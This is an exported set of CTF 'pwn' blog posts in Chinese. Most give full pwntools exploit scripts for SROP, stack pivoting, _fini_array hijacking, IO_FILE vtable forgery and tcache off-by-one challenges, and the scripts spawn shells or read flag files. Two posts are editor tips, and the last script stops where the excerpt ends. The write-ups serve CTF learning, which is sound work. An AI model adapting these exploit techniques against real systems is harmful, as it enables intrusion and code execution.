{"posts":[{"title":"SROP学习","content":" 懒的写了，反正不太难，遇到直接抄这俩题的exp就好了 smallest 借用依晨师傅的堆栈变化图，我是懒狗 exp: from pwn import * local = 1 binary = &quot;./smallest&quot; if local == 1: p = process(binary) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] dbg() main = 0x4000B0 #skip xor rax,rax is 0x40000B3 syscall_ret = 0x4000BE payload = p64(main) * 3 #the first use to return to send payload(write) # the second use to change the last byte to 'b3' #the third use to return p.send(payload) payload = '\\xb3' #rax = 1 write(1,rsp,0x400) p.send(payload) stack = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) print(&quot;[*]stack:&quot;,hex(stack)) context(arch = 'amd64',os = 'linux') sigframe = SigreturnFrame() sigframe.rax = constants.SYS_read sigframe.rdi = 0 sigframe.rsi = stack sigframe.rdx = 0x400 sigframe.rsp = stack sigframe.rip = syscall_ret payload = p64(main) + p64(0) + str(sigframe) p.send(payload) p.send(p64(syscall_ret) + 7*'\\x00') sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = stack + 0x200 sigframe.rsi = 0 sigframe.rdx = 0 sigframe.rsp = stack sigframe.rip = syscall_ret payload = p64(main) + p64(0) + str(sigframe) final = payload + (0x200 - len(payload)) * '\\x00' + &quot;/bin/sh\\x00&quot; p.send(final) p.send(p64(syscall_ret) + 'hackedy') gdb.attach(p) p.interactive() [V&amp;N2020 公开赛]babybabypwn 加了个沙箱 这个直接给了我们系统调用，rt_sigreturn 我们直接用ORW打就行，先用sigreturn调用read，在libc的bss段布置rop链执行，然后就读flag就完事了 exp: from pwn import * local = 0 binary = &quot;./vn_pwn_babybabypwn_1&quot; if local == 1: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,29234) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] context(arch = 'amd64',os = 'linux') libc = ELF('./libc-2.23.so') p.recvuntil('Here is my gift: ') puts = int(p.recv(14),16) libc_base = puts - libc.sym['puts'] print &quot;[*] libc_base:&quot;,hex(libc_base) libc_bss = libc_base + 0x3C5720 read = libc_base + libc.sym['read'] open = libc_base + libc.sym['open'] write = libc_base + libc.sym['write'] sigframe = SigreturnFrame() sigframe.rdi = 0 sigframe.rsi = libc_bss sigframe.rdx = 0x100 sigframe.rip = read sigframe.rsp = libc_bss payload = str(sigframe)[8:] print payload print &quot;payload length:&quot;,len(payload) p.sendafter('Please input magic message: ',payload) pop_rdi_ret = libc_base + 0x0000000000021102 pop_rsi_ret = libc_base + 0x00000000000202e8 pop_rdx_ret = libc_base + 0x0000000000001b92 print hex(pop_rdi_ret) print hex(pop_rsi_ret) print hex(pop_rdx_ret) flag = libc_bss + 152 payload = p64(pop_rdi_ret) + p64(flag) + p64(pop_rsi_ret) + p64(0) + p64(open) payload += p64(pop_rdi_ret) + p64(0x3) + p64(pop_rsi_ret) + p64(libc_bss + 300) + p64(pop_rdx_ret) + p64(0x30) + p64(read) payload += p64(pop_rdi_ret) + p64(0x1) + p64(pop_rsi_ret) + p64(libc_bss + 300) + p64(pop_rdx_ret) + p64(0x30) + p64(write) payload += &quot;flag\\x00&quot; print len(payload) p.send(payload) p.interactive() ","link":"https://l3mon629.github.io/post/srop-xue-xi/"},{"title":"vn招新赛的剩下两道题目","content":"2020vn招新的时候我还没有接触pwn，希望在不久的将来能够追随mz加入vn，wtcl orz [V&amp;N2020 公开赛]warmup 加了个沙箱，我们无法getshell，就用open read write方法来读flag好了 由于是在栈上来布置rop链，我们就不用进行栈迁移了，但是题目开了pie，题目给了puts的地址，所以我们直接用libc的gadget一把梭 exp: from pwn import * #from LibcSearcher import * local = 0 libc = ELF('./libc-2.23.so') binary = &quot;./vn_pwn_warmup&quot; if local == 1: p = process(binary) else: p = remote(&quot;node3.buuoj.cn&quot;,27660) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] p.recvuntil('0x') puts_addr = int(p.recv(12),16) libc_base = puts_addr - libc.sym['puts'] print &quot;[*]libc base:&quot;,hex(libc_base) read = libc_base + libc.sym['read'] write = libc_base + libc.sym['write'] open = libc_base + libc.sym['open'] __free_hook = libc_base + libc.sym['__free_hook'] pop_rdi_ret = libc_base + 0x0000000000021102 pop_rsi_ret = libc_base + 0x00000000000202e8 pop_rdx_ret = libc_base + 0x0000000000001b92 #read(0,__free_hook,0x8) paylaod = p64(0) paylaod += p64(pop_rsi_ret) + p64(__free_hook) paylaod += p64(pop_rdx_ret) + p64(0x8) paylaod += p64(read) #open(__free_hook,0,0) paylaod += p64(pop_rdi_ret) + p64(__free_hook) paylaod += p64(pop_rsi_ret) + p64(0) paylaod += p64(pop_rdx_ret) + p64(0) paylaod += p64(open) #read(0x3,__free_hook,0x30) paylaod += p64(pop_rdi_ret) + p64(0x3) paylaod += p64(pop_rsi_ret) + p64(__free_hook) paylaod += p64(pop_rdx_ret) + p64(0x30) paylaod += p64(read) #write(1,__free_hook,0x30) paylaod += p64(pop_rdi_ret) + p64(0x1) paylaod += p64(pop_rsi_ret) + p64(__free_hook) paylaod += p64(pop_rdx_ret) + p64(0x30) paylaod += p64(write) print(len(paylaod)) #dbg() p.recvuntil('Input something: ') p.send(paylaod) paylaod = 0x78 * 'a' + p64(pop_rdi_ret) p.recvuntil('What\\'s your name?') p.send(paylaod) p.send(&quot;flag&quot;) #gdb.attach(p) p.interactive() ","link":"https://l3mon629.github.io/post/vn-zhao-xin-sai-de-sheng-xia-liang-dao-ti-mu/"},{"title":"sublime一些使用技巧和美化","content":"美化不记录了，官方文档详细的一批，但是着重推荐一个主题Material Theme！！！ 这也太漂亮了兄弟集美们，都给我装！！ https://packagecontrol.io/packages/Material%20Theme 一些快捷键（自己复习用） ctrl + tab:标签页切换 command + j:合并下一行 + ] : 向右缩进 + [ l:选择当前行 回车:相当于vim的o shift + enter: vim + O 方向键:移动到最头 shift + 方向键:上述功能+选择 shift + p: reindent lines 调整缩紧 d:选中当前单词，一直按下去有奇效 /:增加或者取消注释 option + 方向键:按单词移动 绑定快捷键：打开命令面板，搜key bindings来绑定快捷键 一些包安装 AdvancedNewFile:新建文件利器，还有自动补全，我爱了 comman+option+n syncedsidebar:打开一个文件，在侧边栏同步显示，太良心了 快速定位文件及其内容： command + p 附加 &quot;:&quot; : 定位到行号 @ : 定位到函数名 # : 查找字符串 查找功能： command + f 替换： command + option + f 文件跳回： ctrl + - 自定义pwn-heap模版（爽） &lt;snippet&gt; &lt;content&gt;&lt;![CDATA[ from pwn import * local = 1 binary = &quot;${1}&quot; if local == 1: p = process(binary) else: p = remote(&quot;${2}&quot;,${3}) def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] def add(size,content): p.sendlineafter('${4}','${5}'') p.sendlineafter('${6}',str(size)) p.sendafter('${7}',content) def show(index): p.sendlineafter('${8}','${9}'') p.sendlineafter('${10}',str(index)) def free(index): p.sendlineafter('${11}','${12}'') p.sendlineafter('${13}',str(index)) def edit(index,content): p.sendlineafter('${14}','${15}'') p.sendlineafter('${16}',str(index)) gdb.attach(p) p.interactive() ]]&gt;&lt;/content&gt; &lt;!-- Optional: Set a tabTrigger to define how to trigger the snippet --&gt; &lt;tabTrigger&gt;pwn-heap&lt;/tabTrigger&gt; &lt;!-- Optional: Set a scope to limit where the snippet will trigger --&gt; &lt;scope&gt;source.python&lt;/scope&gt; &lt;/snippet&gt; ","link":"https://l3mon629.github.io/post/sublime-yi-xie-shi-yong-ji-qiao-he-mei-hua/"},{"title":"栈迁移总结","content":"昨天某师傅问到了栈迁移，由于舍友非要拉👴去通宵，今天睡到下午六点才醒，特此来总结下 栈迁移其实不太难，本博文主要来总结下栈迁移的妙用：劫持_fini_array 栈迁移 我们先来总结下栈迁移 什么是栈迁移呢？顾名思义就是把栈迁移到了另外一个地方。 那么我们什么时候需要栈迁移呢？ 设想这样一个情景，我们可以溢出两个字长的空间，一个字长用来覆盖old bp寄存器的值，一个用来改写ret返回地址，但是程序没有后门，我们无法利用一个字长来ret2libc，这个时候如果我们能够在一个地址段（比如bss段之类的地方）能够写入大量字节，那么我们便可以ret2libc来拿到shell，所以我们只需要在某个地址段布置好ROP链，然后利用两次 leave ret 来控制程序的执行流程 一个32位的例题 buu的一道题目，[Black Watch 入群题]PWN 漏洞函数： 我们能够在bss段写入0x200个字节同时能够溢出8字节的数据 利用前文分析的手法，不难写出exp from pwn import * from LibcSearcher import * binary = './spwn' #libc = ELF('./libc.so.6') local = 0 if local == 1: p = process(binary) else: p = remote('node3.buuoj.cn',25304) elf = ELF(binary) def dbg(): context.log_level = 'debug' #dbg() write_plt = elf.plt['write'] main_addr = elf.sym['main'] read_got = elf.got['read'] pop_ebp = 0 payload = p32(pop_ebp) + p32(write_plt) + p32(main_addr) + p32(1) + p32(read_got) + p32(0x4) # mov esp,ebp; pop ebp; pop eip; p.sendafter('What is your name?',payload) payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) p.sendafter('What do you want to say?',payload) read_addr = u32(p.recv(4)) print hex(read_addr) libc = LibcSearcher('read',read_addr) libc_base = read_addr - libc.dump('read') system_addr = libc_base + libc.dump('system') binsh_addr = libc_base + libc.dump('str_bin_sh') payload = p32(pop_ebp) + p32(system_addr) + p32(system_addr) + p32(binsh_addr) p.sendafter('What is your name?',payload) payload = 0x18 * 'a' + p32(0x0804A300) + p32(0x08048511) #addr:level p.sendafter('What do you want to say?',payload) p.interactive() 劫持_fini_array 原理在这个地方：https://bbs.pediy.com/thread-259298.htm 我们直接看例题，原理很简单，我们通过例题来详细说明一下如何利用栈迁移来劫持_fini_array Memory Monster II 静态编译的题目，有canary 我们通过alt+t来定位到start函数 start函数的r8寄存器存了__libc_csu_fini函数，rdi寄存器存了main函数地址，我们跟进去 有任意地址写0x18字节的漏洞 我们可以劫持_fini_array[0]为__libc_csu_fini函数，_fini_array[1]为main函数，只要我们不改写_fini_array[0]，我们就能拥有任意地址无限字节写入的能力 思路如下： 1，改写_fini_array，获得无限字节写入的能力 2，在_fini_array + 0x10的位置布置rop链 3，改写_fini_array[0]为leave ret，_fini_array[1]为ret，从而进行栈迁移 至于2，3步为什么呢？下面我们绘图来仔细说明一下 首先第三步，我们为什么能够进行栈迁移呢，因为在__libc_csu_fini里面有一个lea指令可以改变rbp的值为_fini_array[0]的值 详细流程如下： 只要第三步理解了，第二步和第一步都特别简单，通过调用syscall就能拿shell 直接看exp吧； from pwn import * p = process('./main') def dbg(): context.log_level = 'debug' context.terminal = ['tmux','splitw','-h'] __libc_csu_fini = 0x402CB0 _fini_array_0 = 0x4B80B0 _fini_array_1 = 0x4B80B8 target = _fini_array_0 + 0x10 main = 0x401C1D print &quot;================ gadget =================&quot; pop_rax_ret = 0x0000000000448fcc # pop rax ; ret pop_rdi_ret = 0x0000000000401746 # pop rdi ; ret pop_rsi_ret = 0x0000000000406f80 # pop rsi ; ret pop_rdx_ret = 0x0000000000448415 # pop rdx ; ret syscall = 0x0000000000402514 # syscall binsh_addr = 0x0000000000492895 # /bin/sh leave_ret = 0x0000000000401cf3 # leave ; ret ret = 0x0000000000401016 # ret pop_rdx_rsi_ret = 0x000000000044baf9 # pop rdx ; pop rsi ; ret print &quot;================ gadget =================&quot; def change_memory(addr,data): p.recvuntil('addr:') p.sendline(addr) p.recvuntil('data:') p.send(data) print &quot;============= step 1: Get the ability to write infinite address ========&quot; addr = p64(_fini_array_0) payload1 = p64(__libc_csu_fini) + p64(main) change_memory(addr,payload1) print &quot;=========== step 2: Design ROP chain ==========&quot; addr = p64(target) payload2 = p64(pop_rax_ret) + p64(59) change_memory(addr,payload2) addr = p64(target + 0x10) payload3 = p64(pop_rdi_ret) + p64(binsh_addr) change_memory(addr,payload3) addr = p64(target + 0x20) payload4 = p64(pop_rsi_ret) + p64(0) change_memory(addr,payload4) addr = p64(target + 0x30) payload5 = p64(pop_rdx_ret) + p64(0) change_memory(addr,payload5) addr = p64(target + 0x40) payload6 = p64(syscall) change_memory(addr,payload6) print &quot;======== step 3: Stack migration to the rop chain =======&quot; addr = p64(_fini_array_0) payload7 = p64(leave_ret) + p64(ret) change_memory(addr,payload7) p.interactive() ","link":"https://l3mon629.github.io/post/zhan-qian-yi-zong-jie/"},{"title":"vim编辑器","content":"i：当前光标前面插入 I：首行插入 a：光标后面插入 A：尾行插入 o：换行插入 O：在上一行插入 h：左移 j：下移 k：上移 l：右移 y：复制当前字符 d：剪切当前字符 dd：剪切当前行 yy：复制当前行 p：粘贴 c：删掉当前字符并进入写入操作 w：把当前光标移动到下一个词 b：把当前光标移动到上一个词 0：回到行首 /：/加输入的内容，在vim中搜索内容 f：find，fv，找到v字母所在位置 v：进入可视模式 V：按行进入可视模式 G：选中最后一行 gg：到行首 很惊人的模式：control + v，进入可视块模式 分屏： :split：上下分屏 :vsplit：左右分屏 :edit+filename：打开一个新文件 思想：operation + motion ( cw change wold ciw change in wold ci&quot; change in &quot;&quot; di&quot; delete in &quot;&quot; df: 找到：之前的内容并且删掉 ) 在家目录下建立一个.vim文件夹，建立一个.vimrc的配置文件可以自定义快捷键 简单记录下vim配置 let mapleader=&quot; &quot; syntax on noremap &lt;LEADER&gt;&lt;CR&gt; :nohlsearch&lt;CR&gt; set nocompatible filetype on filetype indent on filetype plugin on filetype plugin indent on set mouse=a set encoding=utf-8 let &amp;t_ut='' set expandtab set tabstop=2 set shiftwidth=2 set softtabstop=2 set list set listchars=tab:▸\\ ,trail:▫ set scrolloff=5 set tw=0 set indentexpr= set backspace=indent,eol,start set foldmethod=indent set foldlevel=99 let &amp;t_SI = &quot;\\&lt;Esc&gt;]50;CursorShape=1\\x7&quot; let &amp;t_SR = &quot;\\&lt;Esc&gt;]50;CursorShape=2\\x7&quot; let &amp;t_EI = &quot;\\&lt;Esc&gt;]50;CursorShape=0\\x7&quot; set laststatus=2 set autochdir au BufReadPost * if line(&quot;'\\&quot;&quot;) &gt; 1 &amp;&amp; line(&quot;'\\&quot;&quot;) &lt;= line(&quot;$&quot;) | exe &quot;normal! g'\\&quot;&quot; | endif set number set norelativenumber set cursorline set wrap set hlsearch set showcmd set wildmenu set incsearch set ignorecase set smartcase exec &quot;nohlsearch&quot; map S :w&lt;CR&gt; map Q :q&lt;CR&gt; map R :source $MYVIMRC&lt;CR&gt; map sr :set splitright&lt;CR&gt;:vsplit&lt;CR&gt; map sn :set nosplitright&lt;CR&gt;:vsplit&lt;CR&gt; map so :set nosplitbelow&lt;CR&gt;:split&lt;CR&gt; map sb :set splitbelow&lt;CR&gt;:split&lt;CR&gt; map &lt;LEADER&gt;h &lt;C-w&gt;h map &lt;LEADER&gt;j &lt;C-w&gt;j map &lt;LEADER&gt;k &lt;C-w&gt;k map &lt;LEADER&gt;l &lt;C-w&gt;l map &lt;up&gt; :res +5&lt;CR&gt; map &lt;down&gt; :res -5&lt;CR&gt; map &lt;left&gt; :vertical resize -5&lt;CR&gt; map &lt;right&gt; :vertical resize +5&lt;CR&gt; map nt :tabe&lt;CR&gt; map tr :tabnext&lt;CR&gt; map tl :-tabnext&lt;CR&gt; noremap K 5k noremap J 5j noremap H 5h noremap L 5l call plug#begin('~/.vim/plugged') Plug 'vim-airline/vim-airline' Plug 'connorholyday/vim-snazzy' Plug 'scrooloose/nerdtree', { 'on': 'NERDTreeToggle' } Plug 'Xuyuanp/nerdtree-git-plugin' &quot; Taglist Plug 'majutsushi/tagbar', { 'on': 'TagbarOpenAutoClose' } &quot; Error checking Plug 'w0rp/ale' &quot; Auto Complete Plug 'Valloric/YouCompleteMe' &quot; Undo Tree Plug 'mbbill/undotree/' &quot; Other visual enhancement Plug 'nathanaelkane/vim-indent-guides' Plug 'itchyny/vim-cursorword' &quot; Git Plug 'rhysd/conflict-marker.vim' Plug 'tpope/vim-fugitive' Plug 'mhinz/vim-signify' Plug 'gisphm/vim-gitignore', { 'for': ['gitignore', 'vim-plug'] } &quot; HTML, CSS, JavaScript, PHP, JSON, etc. Plug 'elzr/vim-json' Plug 'hail2u/vim-css3-syntax' Plug 'spf13/PIV', { 'for' :['php', 'vim-plug'] } Plug 'gko/vim-coloresque', { 'for': ['vim-plug', 'php', 'html','javascript', 'css', 'less'] } Plug 'pangloss/vim-javascript', { 'for' :['javascript', 'vim-plug'] } Plug 'mattn/emmet-vim' &quot; Python Plug 'vim-scripts/indentpython.vim' &quot; Bookmarks Plug 'kshenoy/vim-signature' &quot; Other useful utilities Plug 'terryma/vim-multiple-cursors' Plug 'junegunn/goyo.vim' &quot; distraction free writing mode Plug 'tpope/vim-surround' &quot; type ysks' to wrap the word with '' or type cs' to change 'word' to `word` Plug 'godlygeek/tabular' &quot; type ;Tabularize /= to align the = Plug 'gcmt/wildfire.vim' &quot; in Visual mode, type i' to select all text in '',or type i) i] i} ip Plug 'scrooloose/nerdcommenter' &quot; in &lt;space&gt;cc to comment a line &quot; Dependencies Plug 'MarcWeber/vim-addon-mw-utils' Plug 'kana/vim-textobj-user' Plug 'fadein/vim-FIGlet' call plug#end() color snazzy let g:SnazzyTransparent = 1 &quot; === &quot; === NERDTree &quot; === map ff :NERDTreeToggle&lt;CR&gt; let NERDTreeMapOpenExpl = &quot;&quot; let NERDTreeMapUpdir = &quot;&quot; let NERDTreeMapUpdirKeepOpen = &quot;l&quot; let NERDTreeMapOpenSplit = &quot;&quot; let NERDTreeOpenVSplit = &quot;&quot; let NERDTreeMapActivateNode = &quot;i&quot; let NERDTreeMapOpenInTab = &quot;o&quot; let NERDTreeMapPreview = &quot;&quot; let NERDTreeMapCloseDir = &quot;n&quot; let NERDTreeMapChangeRoot = &quot;y&quot; &quot; == &quot; == NERDTree-git &quot; == let g:NERDTreeIndicatorMapCustom = { \\ &quot;Modified&quot; : &quot;✹&quot;, \\ &quot;Staged&quot; : &quot;✚&quot;, \\ &quot;Untracked&quot; : &quot;✭&quot;, \\ &quot;Renamed&quot; : &quot;➜&quot;, \\ &quot;Unmerged&quot; : &quot;═&quot;, \\ &quot;Deleted&quot; : &quot;✖&quot;, \\ &quot;Dirty&quot; : &quot;✗&quot;, \\ &quot;Clean&quot; : &quot;✔︎&quot;, \\ &quot;Unknown&quot; : &quot;?&quot; \\ } &quot; === &quot; === ale &quot; === let b:ale_linters = ['pylint'] let b:ale_fixers = ['autopep8', 'yapf'] &quot; === &quot; === Taglist &quot; === map &lt;silent&gt; T :TagbarOpenAutoClose&lt;CR&gt; &quot; === &quot; === vim-table-mode &quot; === map &lt;LEADER&gt;tm :TableModeToggle&lt;CR&gt; &quot; === &quot; === Python-syntax &quot; === let g:python_highlight_all = 1 &quot; let g:python_slow_sync = 0 &quot; === &quot; === vim-indent-guide &quot; === let g:indent_guides_guide_size = 1 let g:indent_guides_start_level = 2 let g:indent_guides_enable_on_vim_startup = 1 let g:indent_guides_color_change_percent = 1 silent! unmap &lt;LEADER&gt;ig autocmd WinEnter * silent! unmap &lt;LEADER&gt;ig &quot; === &quot; === Goyo &quot; === map &lt;LEADER&gt;gy :Goyo&lt;CR&gt; &quot; === &quot; === vim-signiture &quot; === let g:SignatureMap = { \\ 'Leader' : &quot;m&quot;, \\ 'PlaceNextMark' : &quot;m,&quot;, \\ 'ToggleMarkAtLine' : &quot;m.&quot;, \\ 'PurgeMarksAtLine' : &quot;dm-&quot;, \\ 'DeleteMark' : &quot;dm&quot;, \\ 'PurgeMarks' : &quot;dm/&quot;, \\ 'PurgeMarkers' : &quot;dm?&quot;, \\ 'GotoNextLineAlpha' : &quot;m&lt;LEADER&gt;&quot;, \\ 'GotoPrevLineAlpha' : &quot;&quot;, \\ 'GotoNextSpotAlpha' : &quot;m&lt;LEADER&gt;&quot;, \\ 'GotoPrevSpotAlpha' : &quot;&quot;, \\ 'GotoNextLineByPos' : &quot;&quot;, \\ 'GotoPrevLineByPos' : &quot;&quot;, \\ 'GotoNextSpotByPos' : &quot;mn&quot;, \\ 'GotoPrevSpotByPos' : &quot;mp&quot;, \\ 'GotoNextMarker' : &quot;&quot;, \\ 'GotoPrevMarker' : &quot;&quot;, \\ 'GotoNextMarkerAny' : &quot;&quot;, \\ 'GotoPrevMarkerAny' : &quot;&quot;, \\ 'ListLocalMarks' : &quot;m/&quot;, \\ 'ListLocalMarkers' : &quot;m?&quot; \\ } &quot; === &quot; === Undotree &quot; === let g:undotree_DiffAutoOpen = 0 map L :UndotreeToggle&lt;CR&gt; ","link":"https://l3mon629.github.io/post/vim-bian-ji-qi/"},{"title":"IO_FILE学习","content":"复习说明 _IO_FILE_plus 结构体：最全面的结构体 extern struct _IO_FILE_plus *_IO_list_all; _IO_list_all：_IO_FILE_plus类型的一个指针 struct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; 结构体 _IO_FILE_plus ，它有两部分组成。 在第一部分， file 在 Linux 系统的标准 IO 库中是用于描述文件的结构，称为文件流。file结构在程序执行，fread、fwrite 等标准函数需要文件流指针来指引去调用虚表函数。 特殊地， fopen 等函数时会进行创建，并分配在堆中。我们常定义一个指向 file结构的指针来接收这个返回值。 _IO_jump_t: 在第二部分，刚刚谈到的虚表就是 _IO_jump_t 结构体，在此虚表中，有很多函数都调用其中的子函数，无论是关闭文件，还是报错输出等等，都有对应的字段，而这正是可以攻击者可以被利用的突破口。 值得注意的是，在 _IO_list_all 结构体中，_IO_FILE 结构是完整嵌入其中，而 vtable 是一个虚表指针，它指向了 _IO_jump_t 结构体。一个是完整的，一个是指针，这点一定要切记。 反正大致是这么个流程就对了 利用方法 伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。 因此 vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。 ctf-wiki上的例子： int main(void) { FILE *fp; long long *vtable_ptr; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); vtable_ptr=*(long long*)((long long)fp+0xd8); //get vtable vtable_ptr[7]=0x41414141 //xsputn printf(&quot;call 0x41414141&quot;); } 不过在目前 libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的。 经过调试发现确实无法进行写入。 但是我们可以换一种利用思路，即伪造vtable的形式来利用 #define system_ptr 0x7ffff7a52390; int main(void) { FILE *fp; long long *vtable_addr,*fake_vtable; fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;); fake_vtable=malloc(0x40); vtable_addr=(long long *)((long long)fp+0xd8); //vtable offset vtable_addr[0]=(long long)fake_vtable; memcpy(fp,&quot;sh&quot;,3); fake_vtable[7]=system_ptr; //xsputn fwrite(&quot;hi&quot;,2,1,fp); } 原理：vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 &quot;sh&quot; 写入_IO_FILE_plus 头部(即fp)。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(&quot;sh&quot;)。 如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\\stdout\\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。 一些思路： 程序调用exit时，会遍历_IO_list_all，用 IO_2_1_stdout 下的 vatable 中 _setbuf 函数。 例题 [GKCTF2020]Domo 分析和思路 main函数 add 函数，发现我们可以申请九个chunk，并且题目给我们加了一个对hook函数的检查，发现申请的时候有个off-by-null，比如当我们申请的块为0x18时，下一个chunk的size为的最后一个字节会被我们覆盖为0 edit 函数，我们可以修改任意一个地址的一个字节内容，但是edit函数只能使用一次 还有show函数和delete函数，在此不作赘述 思路： 第一步：泄漏地址，我们可以申请unsorted bin的大小来leak libc的地址，可以利用fastbin大小的chunk来leak heap段的地址 第二步：利用 off by null来构造重叠的chunk，向前unlink，布置一个fake chunk，然后申请一个big chunk获得一个chunk的控制能力后利用fastbin attack可以获得一个合适地址写的能力 第三步：攻击_IO_2_1_stdin_的vtable指针，在附近构造一个fastbin chunk并在heap段上伪造一个fake _IO_file_jumps，然后填入gadget，利用可写能力将vtable的值修改到fake _IO_file_jumps，从而getshell 注意事项： 1，leak heap address是为了能够在unlink的时候伪造fd和bk绕过检查，并且在后续中改写vtable的时候利用 2，注意unlink的检查 3，用这个思路解题的过程中并没有用到edit功能 exp: from pwn import * local = 1 if local == 1: p = process('./domo') else: p = remote('node3.buuoj.cn',29623) context.terminal = ['tmux','splitw','-h'] def dbg(): context.log_level = 'debug' def add(size,content): p.sendlineafter('&gt;','1') p.sendlineafter('size:',str(size)) p.sendafter('content:',content) def delete(index): p.sendlineafter('&gt;','2') p.sendlineafter('index:',str(index)) def show(index): p.sendlineafter('&gt;','3') p.sendlineafter('index:',str(index)) def edit(addr,num): p.sendlineafter('&gt;','4') p.sendlineafter('addr:',str(addr)) p.sendafter('num:',num) #dbg() libc = ELF('./libc-2.23.so') print &quot;============= step 1: leak libc and heap addr =================&quot; add(0x80,'aaaaaaaa') #chunk0 add(0x10,'protect') #chunk1 delete(0) add(0x80,'\\x78') #chunk0 #dbg() show(0) libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8,'\\x00')) - 88 - 0x10 - libc.sym['__malloc_hook'] print &quot;[*] libc base:&quot; + hex(libc_base) add(0x20,'A') #chunk2 add(0x20,'B') #chunk3 delete(2) delete(3) add(0x20,'a') #chunk2 show(2) heap_addr = u64(p.recvuntil('\\x55')[-6:].ljust(8,'\\x00')) - 0x1061 print &quot;[*] heap address: &quot; + hex(heap_addr) print &quot;=================== step 2: off by null to overlap =================&quot; offset_heap_chunk3 = 0x1120 fake_chunk = heap_addr + offset_heap_chunk3 payload = p64(0) + p64(0xb1) + p64(fake_chunk+0x18) + p64(fake_chunk+0x20) + p64(fake_chunk+0x10) add(0x40,payload) #chunk3 add(0x68,'a') #chunk4 add(0xf0,'b') #chunk5 delete(4) print &quot;====== to use off by null ======&quot; add(0x68,0x60 * '\\x00' + p64(0xb0)) #chunk4 print &quot;===== unlink to overlap =====&quot; delete(5) add(0xc0,'a') #chunk5 add(0x60,'b') #chunk6 delete(6) delete(4) delete(5) #gdb.attach(p) print &quot;============ step 3: to make fake fake_vtable to get shell ================&quot; _IO_2_1_stdin_ = libc_base + libc.sym['_IO_2_1_stdin_'] _IO_file_jumps = libc_base + libc.sym['_IO_file_jumps'] fake_chunk = _IO_2_1_stdin_ + 160 - 3 payload = '\\x00' * 0x38 + p64(0x71) + p64(fake_chunk) add(0xc0,payload) #chunk5 one_gadget = libc_base + 0xf02a4 add(0xa8,p64(0) * 2 + p64(one_gadget) * 19) fake_vtable = heap_addr + 0x1270 payload = '\\x00' * 3 + p64(0) + p64(0) + p64(0) + p64(0) * 2 + p64(fake_vtable) add(0x60,'a') #gdb.attach(p) add(0x60,payload) #gdb.attach(p) p.interactive() ","link":"https://l3mon629.github.io/post/io_file-xue-xi/"},{"title":"ubuntu18中的off-by-one","content":"逆向 main函数 add函数，可以发现我们只能创建0x18和0x38大小的chunk，而且程序会给我们创建一个chunk来管理我们的chunk delete函数，并没有UAF漏洞 show函数，可以用来泄漏地址 edit函数，可以看到存在off-by-one漏洞 利用思路 回顾一下ubuntu16.04中的利用思路： malloc(3个chunk) off by one溢出改size free1，free2，进去unsorted bin，泄漏地址 malloc big chunk，修改重叠chunk的fd指针，结束。 在ubuntu18中引进了tcache机制，使得泄漏地址变得更为困难（因为要逃逸tcache bin） 思路大体相同，但是在调试过程中要更为细心。 流程和exp 我们先申请一个chunk来看一下内存分布 可以看到管理chunk中有一个指针，我们想办法来控制它 首先要想办法来泄漏地址，由于我们只能malloc两种size的chunk，我们只能构造出0x41的chunk作为big chunk，把一个管理chunk包含进去，然后free掉bigchunk，这个时候tcache bins里面有两个chunk，一个是0x40大小一个是0x20大小，我们这个时候malloc(0x38)大小的chunk，可以把0x20作为控制信息，0x40作为mem chunk，但是注意，我们之前的bigchunk恰好是管理chunk，也就是说我们拥有了向管理chunk内写入的能力。 我们可以写入elf.got['free']，然后show一下，泄漏出__libc_free，然后覆盖free为system，就能拿shell了 exp: from pwn import * from LibcSearcher import * local = 1 if local == 1: p = process('./npuctf_2020_easyheap') else: p = remote('node3.buuoj.cn',26806) elf = ELF('./npuctf_2020_easyheap') libc = ELF('./libc-2.27.so') def dbg(): context.log_level = 'debug' def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap(0x10 or 0x20 only) :',str(size)) p.sendafter('Content:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content:',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def free(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) add(0x18,'a') #chunk 0 pause() add(0x18,'aaaaaaaa') #chunk 1 add(0x18,'AAAAAAAA') #chunk 2 payload = b'/bin/sh;' + 0x10 * b'A' + b'\\x41' edit(0,payload) free(1) payload = p64(0) * 3 + p64(0x21) + p64(0x38) + p64(elf.got['free']) #payload = p64(0) * 3 + p64(0x21) + p64(0x38) + p64(elf.got['atoi']) add(0x38,payload) #chunk 1 #dbg() show(1) free_addr = u64(p.recvuntil('\\x7f')[-6:].ljust(8,b'\\x00')) print(&quot;[*] free address: &quot;,hex(free_addr)) ''' #libc_base = free_addr - 0x81540 libc_base = free_addr - 0x35e40 __free_hook = libc_base + 0x3b48e8 system_addr = libc_base + 0x41af0 print(&quot;[*] libc_base ---&gt; &quot;,hex(libc_base)) #print(&quot;[*] __free_hook ---&gt; &quot;,hex(__free_hook)) print(&quot;[*] system_addr ----&gt; &quot;,hex(system_addr)) ''' libc = LibcSearcher('free',free_addr) libc_base = free_addr - libc.dump('free') 